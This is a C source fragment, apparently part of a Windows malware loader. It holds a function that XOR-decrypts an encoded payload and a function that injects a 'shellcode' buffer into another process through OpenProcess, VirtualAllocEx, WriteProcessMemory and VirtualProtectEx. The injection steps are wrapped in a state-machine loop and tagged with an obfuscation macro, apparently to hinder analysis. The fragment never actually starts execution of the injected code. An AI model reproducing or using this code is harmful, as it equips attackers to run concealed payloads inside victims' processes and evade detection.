OBFUSC8_FUNC
void MyDecrypt(BYTE* data, DWORD len)
{
    for (DWORD i = 0; i < len; i++)
    {
        data[i] ^= 0x7A;
        data[i] = (data[i] << 3) | (data[i] >> 5);
    }
}


OBFUSC8_FUNC
BOOL MyInject(DWORD pid, BYTE* shellcode, DWORD len)
{
    int state = 0;
    BOOL done = FALSE;

    HANDLE hProc = NULL;
    LPVOID pMem = NULL;

    do {
        if (state == 0) {
            hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            state = 1;
        }
        else if (state == 1) {
            pMem = VirtualAllocEx(hProc, 0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            state = 2;
        }
        else if (state == 2) {
            WriteProcessMemory(hProc, pMem, shellcode, len, 0);
            state = 3;
        }
        else if (state == 3) {
            DWORD old;
            VirtualProtectEx(hProc, pMem, len, PAGE_EXECUTE_READ, &old);
            state = 100;
            done = TRUE;
        }

    } while (!done);

    CloseHandle(hProc);
    return TRUE;
}
